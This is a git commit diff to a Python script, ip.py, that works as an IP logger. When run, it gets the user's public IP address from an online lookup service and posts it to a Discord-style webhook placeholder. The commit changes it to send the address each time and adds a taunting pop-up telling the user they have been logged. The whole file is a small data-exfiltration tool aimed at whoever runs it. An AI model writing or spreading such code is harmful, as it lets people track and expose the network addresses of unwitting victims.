0ee90d4a81000760a79881f198590bb97635519f
Newzboy <47164996+Newzboy@users.noreply.github.com>
2021-04-26 09:54:05 -0400

    Update ip.py

--- ip.py
+++ ip.py
@@ -1,13 +1,17 @@
 import requests
+import tkinter
+
 webhook = "WEBHOOK_URL_HERE"
 
 def getipa():
     x = requests.get('https://api.ipify.org')
     ipa = x.text
-    print(ipa)
+    tkinter.messagebox.showinfo(title='IP Logged', message='Get IP logged kid.')
+    sendipa(ipa)
     
 def sendipa(ipa):
-    data = {"username": 'New IP', "content": ipa}
+    data = {"username": 'New IP'}
+    data["embeds"] = [{"description" : ipa, "title" : "New Log"}]
     requests.post(webhook, json=data)
 
 getipa()
